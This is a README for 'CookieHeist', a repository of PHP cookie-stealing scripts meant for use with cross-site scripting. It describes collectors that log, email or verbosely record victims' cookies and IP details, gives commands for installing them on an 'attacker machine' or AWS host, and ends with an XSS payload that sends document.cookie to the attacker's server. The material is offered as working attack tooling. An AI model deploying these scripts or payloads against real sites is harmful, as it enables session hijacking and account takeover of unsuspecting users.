# CookieHeist
PHP Cookie Stealing Scripts for use in XSS

1. Cookiesteal-simple.php - Records whatever "c" parameter holds, in example case the document.cookie string, writes value to log.txt. 

2. Cookiemail.php - This version code will mail the cookies to hacker mail using the PHP() mail function with subject “Stolen cookies”.

3. Cookiesteal-v.php (verbose) - Collects the IP address, port number, host(usually computer-name), user agent and cookie.

## Usage
1. On the remote attacker machine, start the webserver (Apache2 in example):

sudo service apache2 start

2. Git clone the repo locally and then push the chosen "Cookie stealer" PHP script from local host to the attacking machine


git clone https://github.com/RxSec/CookieHeist


cd CookieHeist


sudo scp cookiestealer-simple.php username@AttackMachine:/var/www/html/


sudo scp log.txt username@AttackMachine:/var/www/html/

AWS Version:

scp -i AWS-Key.pem cookiesteal-simple.php ec2-user@ec2[YOUR IP].us-east-2.compute.amazonaws.com:~/.

sudo mv cookiestealer-simple.php /var/www/html/

Example: http://[Attacker Webserver]/cookiesteal-simple.php

XSS Payload Example: <script javascript:text>document.location="http://[Attacker Webserver]?c=" + document.cookie + "&t=Alert"; </script>
